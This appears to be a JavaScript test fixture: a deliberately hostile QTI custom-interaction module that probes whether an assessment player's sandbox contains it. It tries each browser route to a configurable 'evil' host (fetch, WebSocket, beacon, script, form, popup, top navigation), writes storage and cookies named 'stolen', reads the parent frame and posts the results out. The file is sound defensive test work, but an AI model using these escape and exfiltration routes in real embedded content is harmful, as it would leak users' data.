"use strict";
// A module that tries to leave its frame: the network by every way a script has, the player's document, storage,
// popups and the top window. It reports each attempt, and forges messages to the player.
define(["qtiCustomInteractionContext"], function (context) {
  function settle(setup) {
    return new Promise(function (resolve) {
      try {
        setup(resolve);
      } catch (error) {
        resolve("blocked");
      }
      setTimeout(resolve, 3000, "timeout");
    });
  }
  function load(element, url) {
    return settle(function (resolve) {
      element.addEventListener("load", function () {
        resolve("reached");
      });
      element.addEventListener("error", function () {
        resolve("blocked");
      });
      if (element.tagName === "LINK") element.rel = "stylesheet";
      element.src = url;
      element.href = url;
      document.head.appendChild(element);
    });
  }
  function sync(attempt) {
    try {
      attempt();
      return "reached";
    } catch (error) {
      return "blocked";
    }
  }
  function attempts(evil) {
    var results = {};
    var pending = [
      settle(function (resolve) {
        fetch(evil + "/fetch").then(
          function () {
            resolve("reached");
          },
          function () {
            resolve("blocked");
          },
        );
      }).then(function (value) {
        results.fetch = value;
      }),
      settle(function (resolve) {
        var request = new XMLHttpRequest();
        request.onload = function () {
          resolve("reached");
        };
        request.onerror = function () {
          resolve("blocked");
        };
        request.open("GET", evil + "/xhr");
        request.send();
      }).then(function (value) {
        results.xhr = value;
      }),
      settle(function (resolve) {
        var socket = new WebSocket(evil.replace("http", "ws") + "/socket");
        socket.onopen = function () {
          resolve("reached");
        };
        socket.onerror = function () {
          resolve("blocked");
        };
      }).then(function (value) {
        results.webSocket = value;
      }),
      settle(function (resolve) {
        var source = new EventSource(evil + "/events");
        source.onopen = function () {
          resolve("reached");
        };
        source.onerror = function () {
          resolve("blocked");
        };
      }).then(function (value) {
        results.eventSource = value;
      }),
      load(new Image(), evil + "/image.gif").then(function (value) {
        results.image = value;
      }),
      load(document.createElement("script"), evil + "/script.js").then(function (value) {
        results.script = value;
      }),
      load(document.createElement("link"), evil + "/style.css").then(function (value) {
        results.stylesheet = value;
      }),
      settle(function (resolve) {
        import(evil + "/module.js").then(
          function () {
            resolve("reached");
          },
          function () {
            resolve("blocked");
          },
        );
      }).then(function (value) {
        results.dynamicImport = value;
      }),
    ];
    // sendBeacon queues the request and the policy refuses it later, so only the server can tell.
    sync(function () {
      navigator.sendBeacon(evil + "/beacon", "x");
    });
    // A worker from another origin fails after the constructor returns in some engines, so only the server can tell.
    sync(function () {
      new Worker(evil + "/worker.js");
    });
    results.eval = sync(function () {
      (0, eval)("1");
    });
    results.parentDocument = sync(function () {
      return parent.document.title;
    });
    results.parentLocation = sync(function () {
      return parent.location.href;
    });
    results.topLocation = sync(function () {
      return top.location.href;
    });
    results.referrer = sync(function () {
      if (document.referrer === "") throw new Error("no referrer");
    });
    results.localStorage = sync(function () {
      localStorage.setItem("stolen", "1");
    });
    results.sessionStorage = sync(function () {
      sessionStorage.setItem("stolen", "1");
    });
    results.cookie = sync(function () {
      document.cookie = "stolen=1";
      if (document.cookie === "") throw new Error("no cookie");
    });
    results.indexedDb = sync(function () {
      indexedDB.open("stolen");
    });
    results.popup = sync(function () {
      if (window.open(evil + "/popup") === null) throw new Error("no window");
    });
    // A sandbox without allow-top-navigation leaves the attempt without a result in some engines.
    sync(function () {
      top.location.href = evil + "/top";
    });
    sync(function () {
      var form = document.createElement("form");
      form.action = evil + "/form";
      document.body.appendChild(form);
      form.submit();
    });
    sync(function () {
      var frame = document.createElement("iframe");
      frame.src = evil + "/frame";
      document.body.appendChild(frame);
    });
    return Promise.all(pending).then(function () {
      return results;
    });
  }
  context.register({
    typeIdentifier: "urn:test:hostile",
    getInstance: function (dom, configuration) {
      var instance = {
        typeIdentifier: "urn:test:hostile",
        getResponse: function () {
          return { base: { integer: 1 } };
        },
        getState: function () {
          return "{}";
        },
      };
      configuration.onready(instance, "{}");
      attempts(configuration.properties.evil).then(function (results) {
        parent.postMessage({ probe: "hostile", results: results }, "*");
      });
      return instance;
    },
  });
});
